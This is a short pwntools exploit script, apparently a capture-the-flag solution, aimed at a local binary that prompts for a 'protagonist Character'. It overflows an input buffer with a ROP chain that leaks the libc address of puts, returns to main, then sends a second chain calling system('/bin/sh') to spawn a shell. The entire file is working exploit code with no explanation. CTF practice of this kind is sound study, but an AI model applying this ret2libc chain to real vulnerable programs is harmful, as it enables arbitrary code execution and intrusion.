from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
libc = e.libc

r = ROP(e)

gs = '''
break *0x4013e9
continue
'''


def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    else:
        return process(e.path)


p = start()

chain = cyclic(13)
chain += b'\x00'*5
chain += cyclic(8)
chain += p64(r.find_gadget(['pop rdi', 'ret'])[0])
chain += p64(e.got['puts'])
chain += p64(e.plt['puts'])
chain += p64(e.sym['main'])
p.sendlineafter(b'protagonist Character:', chain)

p.recvuntil(b'You are not the hero of time!')
p.recvline()
leak = u64(p.recvline().strip(b'\n').ljust(8, b'\x00'))
print(hex(leak))

libc.address = leak-libc.sym['puts']
log.info('Libc Leak: 0x%x' % libc.address)

chain = cyclic(13)
chain += b'\x00'*5
chain += cyclic(8)
chain += p64(r.find_gadget(['pop rdi', 'ret'])[0])
chain += p64(next(libc.search(b'/bin/sh')))
chain += p64(r.find_gadget(['ret'])[0])
chain += p64(libc.sym['system'])
p.sendlineafter(b'protagonist Character:', chain)


p.interactive()
